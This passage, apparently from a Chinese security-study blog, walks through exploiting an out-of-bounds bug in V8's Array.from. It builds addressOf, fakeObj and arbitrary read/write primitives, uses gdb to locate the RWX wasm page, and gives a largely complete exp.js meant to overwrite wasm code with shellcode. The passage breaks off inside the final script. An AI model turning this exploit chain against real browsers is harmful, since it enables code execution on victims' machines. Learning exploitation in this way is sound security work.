<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = obj;</span><br><span class="line">	<span class="comment">//change the maps of obj_arr</span></span><br><span class="line">	oobArray[<span class="number">48</span>] = double_arr_map;</span><br><span class="line">	<span class="comment">//return the address</span></span><br><span class="line">	<span class="keyword">var</span> addr = f2i(obj_arr[<span class="number">0</span>])<span class="number">-1</span>;</span><br><span class="line">	<span class="comment">//var addr = obj_arr[0].toString();</span></span><br><span class="line">	<span class="comment">//change back</span></span><br><span class="line">	oobArray[<span class="number">48</span>] = obj_arr_map;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="fakeObj原语"><a href="#fakeObj原语" class="headerlink" title="fakeObj原语"></a>fakeObj原语</h5><p>fakeObj原语和addressOf原语的思路相似，我们的目标是将某个地址对应的内存包装成一个合法的对象从而访问其属性。首先用<code>double_arr[0] = i2f(addr+1)</code>存放目标地址到数组的elements，之后越界写<code>double_arr-&gt;map=obj_arr_map</code>将浮点数数组改为对象数组类型，此时返回的<code>double_arr[0]</code>即为一个obj。但是这个<code>address</code>所在的内存需要为一个合法的<code>obj</code>，也就是说我们需要提前布置一些属性在其中，比如<code>map/prototype/elements/length</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	double_arr[<span class="number">0</span>] = i2f(addr+<span class="number">1</span>);</span><br><span class="line">	<span class="comment">//change the maps of double_arr</span></span><br><span class="line">	oobArray[<span class="number">28</span>] = obj_arr_map;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">var</span> res = double_arr[<span class="number">0</span>];</span><br><span class="line">	oobArray[<span class="number">28</span>] = double_arr_map;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#####　arbRead/arbWrite</p>
<p>当我们有了上述两个原语，我们可以在其基础上构造任意地址读写的函数。首先我们通过addressOf得到<code>double_arr</code>对象的地址，据此根据偏移计算出<code>double_arr-&gt;elements</code>对象的地址，我们使用<code>fakeObj</code>原语将<code>elements-&gt;content</code>这块内存伪造成一个obj(需要布置合法的属性在其中)。对于这个伪造的对象<code>fake_obj</code>，我们可以通过修改<code>double_arr</code>元素来控制其属性<code>elements</code>为<code>target_addr-0x10</code>，再访问<code>fake_obj[0]</code>即可得到目标地址处的值。</p>
<p>同样地，对于arbWrite，我们只需要对<code>fake_obj[0]</code>赋值即可实现任意地址写。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  double_arr[<span class="number">2</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> res = fake_obj[<span class="number">0</span>];</span><br><span class="line">  double_arr[<span class="number">2</span>] = i2f(elements_addr+<span class="number">0x11</span>);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  double_arr[<span class="number">2</span>] = i2f(addr<span class="number">-0x10</span>+<span class="number">1</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = i2f(val);</span><br><span class="line">  double_arr[<span class="number">2</span>] = i2f(elements_addr+<span class="number">0x11</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-js"><a href="#exp-js" class="headerlink" title="exp.js"></a>exp.js</h4><p>看着以前的博客，exp写的磕磕绊绊。这个版本的<code>DataView</code>没有<code>SetUint64</code>方法，这里拿<code>kennan</code>的功能函数直接来用。中间踩了很多坑，有些原理还没弄明白，这里记一下。</p>
<ol>
<li>关于gc:学长说gc不必像下面一样多次调用，放在最后调用也一样，具体原理需要再看看gc</li>
<li>在构造arbRead/arbWrite时不要从<code>elements-&gt;content</code>开始伪造Obj(和上面讲的原理有出入)，这是因为在<code>fakeObj</code>中有对<code>double_arr[0]</code>的赋值，我们想伪造其为obj就必须让<code>double_arr[0]</code>恒为<code>double_arr_maps</code>，否则这个obj会在调用<code>fakeObj</code>后被认定为非法对象，因此我们越过这个元素在后面伪造对象。</li>
<li>length字段需要伪造为<code>i2f(0x1000000000)</code>，高四字节才表示length，开始设置为2在gdb中显示大小为0</li>
<li>calculator的shellcode是网上找的，看上去sc的语法和intel asm有些出入，要再研究一下</li>
<li>关于asm_addr的寻找:这里最开始用之前OOB那道题目的思路去找，发现到<code>data</code>字段那块这个版本的结构体就没有这个属性了，在姚学长的数字经济那里寻找wasm的方法也不好使。刚好panda学长在旁边跟俺唠嗑，学长讲说通过<code>code</code>字段也可以找到wasm的地址，我调试了一下发现确实，有点像之前D3CTF里<code>libroll</code>那道题我找地址的方法，汇编中找call的位置2333.测试代码如下：</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br></pre></td></tr></table></figure>
<p>我们首先找到<code>f</code>的地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2320c0ba7ff1: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0xdcb19c0cde1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2320c0b84611 &lt;JSFunction (sfi = 0x9d907d85559)&gt;</span><br><span class="line"> - elements: 0x9d907d82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x2320c0ba7ed1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x9d907dcf6d9 &lt;String[1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x2320c0b83eb1 &lt;FixedArray[234]&gt;</span><br><span class="line"> - code: 0xd608010e201 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x2320c0ba7d31</span><br><span class="line">   context 0x55db56829430</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x34b834c0e0f9 &lt;PropertyArray[3]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x9d907dd0299 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x9d907dd0229 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x9d907dd0149 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x9d907dd01b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    0x9d907dcfaf9 &lt;Symbol: (wasm_instance_symbol)&gt;: 0x2320c0ba7d31 &lt;Instance map = 0xdcb19c0bd61&gt; (data field 0) properties[0]</span><br><span class="line">    0x9d907dcfad9 &lt;Symbol: (wasm_function_index_symbol)&gt;: 0 (data field 1) properties[1]</span><br></pre></td></tr></table></figure>
<p>在偏移为18的地方得到<code>shared_info</code>的地址<code>0x2320c0ba7ed1</code>,再找到<code>code</code>字段，<code>code+0x70+2</code>处存放的就是<code>wasm_addr</code>的地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x2320c0ba7ed1</span><br><span class="line">0x2320c0ba7ed1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1a6238d02889 &lt;Map[128]&gt;</span><br><span class="line"> - name: 0x9d907dcf6d9 &lt;String[1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 128</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - code: 0xd608010e201 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: 0</span><br><span class="line"> - start position: 0</span><br><span class="line"> - end position: 0</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x9d907d82459 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x9d907d82931: [FeedbackMetadata] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1a6238d03071 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line"> - no preparsed scope data</span><br><span class="line">gdb-peda$ job 0xd608010e201</span><br><span class="line">0xd608010e201: [Code]</span><br><span class="line"> - map: 0x1a6238d028e1 &lt;Map&gt;</span><br><span class="line">kind = JS_TO_WASM_FUNCTION</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = 0xd608010e201</span><br><span class="line">Body (size = 67)</span><br><span class="line">Instructions (size = 44)</span><br><span class="line">0xd608010e260     0  55             push rbp</span><br><span class="line">0xd608010e261     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0xd608010e264     4  56             push rsi</span><br><span class="line">0xd608010e265     5  57             push rdi</span><br><span class="line">0xd608010e266     6  48be30948256db550000 REX.W movq rsi,0x55db56829430    ;; wasm context reference</span><br><span class="line">0xd608010e270    10  49ba00d067e654160000 REX.W movq r10,0x1654e667d000  (wasm <span class="keyword">function</span>)    ;; js to wasm call</span><br><span class="line">0xd608010e27a    1a  41ffd2         call r10</span><br><span class="line">0xd608010e27d    1d  48c1e020       REX.W shlq rax, 32</span><br><span class="line">0xd608010e281    21  488be5         REX.W movq rsp,rbp</span><br><span class="line">0xd608010e284    24  5d             pop rbp</span><br><span class="line">0xd608010e285    25  c20800         ret 0x8</span><br><span class="line">0xd608010e288    28  90             nop</span><br><span class="line">0xd608010e289    29  0f1f00         nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Safepoints (size = 23)</span><br><span class="line">0xd608010e27d      1d    NA  0000 (sp -&gt; fp)  &lt;none&gt;</span><br><span class="line"></span><br><span class="line">RelocInfo (size = 4)</span><br><span class="line">0xd608010e268  wasm context reference</span><br><span class="line">0xd608010e272  js to wasm call</span><br><span class="line"></span><br><span class="line">gdb-peda$ vmmap 0x55db56829430</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x000055db5679f000 0x000055db5686d000 rw-p	[heap]</span><br><span class="line">gdb-peda$ vmmap 0x1654e667d000</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x00001654e667d000 0x00001654e667e000 rwxp	mapped</span><br><span class="line">gdb-peda$ x/4gx 0xd608010e200+0x70</span><br><span class="line">0xd608010e270:	0x1654e667d000ba49	0xe0c148d2ff410000</span><br><span class="line">0xd608010e280:	0x0008c25de58b4820	0x00000001001f0f90</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>getshell的方法和之前相同，劫持<code>data_buf</code>的<code>backing_store</code>为<code>wasm_addr</code>，通过<code>DataView</code>修改原本的wasm代码为shellcode，最后调用<code>wasm_func</code>即可</li>
<li>关于调试:这次调试还是release+debug一起调的，学长说可以修改DCHECK的宏总是返回true或者找到一个总开关注释掉，回头研究一下。</li>
</ol>
<p>最终的exp如下。</p>
<p><img src="/2021/05/13/v8-basic/222.gif" alt></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ((<span class="number">1024</span>*<span class="number">1024</span>));i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a dataview</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// const getMethods = (obj) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//   let properties = new Set()</span></span><br><span class="line"><span class="comment">//   let currentObj = obj</span></span><br><span class="line"><span class="comment">//   do &#123;</span></span><br><span class="line"><span class="comment">//     Object.getOwnPropertyNames(currentObj).map(item =&gt; properties.add(item))</span></span><br><span class="line"><span class="comment">//   &#125; while ((currentObj = Object.getPrototypeOf(currentObj)))</span></span><br><span class="line"><span class="comment">//   return [...properties.keys()].filter(item =&gt; typeof obj[item] === 'function')</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(getMethods(dv));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf8 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf8);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf8);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = d;</span><br><span class="line">  <span class="keyword">let</span> r = <span class="built_in">Array</span>.from(u32);</span><br><span class="line">  <span class="keyword">return</span> r[<span class="number">1</span>]*<span class="number">0x100000000</span>+r[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// uint64 =&gt; double64</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> r = [];</span><br><span class="line">  r[<span class="number">0</span>] = <span class="built_in">parseInt</span>(u % <span class="number">0x100000000</span>);</span><br><span class="line">  r[<span class="number">1</span>] = <span class="built_in">parseInt</span>((u - r[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">  u32.set(r);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"a"</span>:<span class="string">"1"</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">7.7</span>];</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    max : <span class="number">1000</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter == <span class="keyword">this</span>.max) &#123;</span><br><span class="line">        oobArray.length = <span class="number">10</span>;</span><br><span class="line">				<span class="comment">//oobArray[2048] = 1.1;</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> double_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>];</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> obj_arr = [a];</span><br><span class="line">gc();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">%DebugPrint(double_arr);</span></span><br><span class="line"><span class="comment">%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">%SystemBreak();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//leak double_arr map</span></span><br><span class="line"><span class="keyword">var</span> double_arr_map = oobArray[<span class="number">28</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]leaked double arr maps : "</span> + hex(f2i(double_arr_map)));</span><br><span class="line"><span class="comment">//leak obj_arr map</span></span><br><span class="line"><span class="keyword">var</span> obj_arr_map = oobArray[<span class="number">48</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]leaked obj arr maps : "</span> + hex(f2i(obj_arr_map)));</span><br><span class="line"><span class="comment">//make addressOf and fake obj</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = obj;</span><br><span class="line">	<span class="comment">//change the maps of obj_arr</span></span><br><span class="line">	oobArray[<span class="number">48</span>] = double_arr_map;</span><br><span class="line">	<span class="comment">//return the address</span></span><br><span class="line">	<span class="keyword">var</span> addr = f2i(obj_arr[<span class="number">0</span>])<span class="number">-1</span>;</span><br><span class="line">	<span class="comment">//var addr = obj_arr[0].toString();</span></span><br><span class="line">	<span class="comment">//change back</span></span><br><span class="line">	oobArray[<span class="number">48</span>] = obj_arr_map;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line">	double_arr[<span class="number">0</span>] = i2f(addr+<span class="number">1</span>);</span><br><span class="line">	<span class="comment">//change the maps of double_arr</span></span><br><span class="line">	oobArray[<span class="number">28</span>] = obj_arr_map;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="keyword">var</span> res = double_arr[<span class="number">0</span>];</span><br><span class="line">	oobArray[<span class="number">28</span>] = double_arr_map;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log("------------leaking using addressOf-------------");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//wasm method</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span 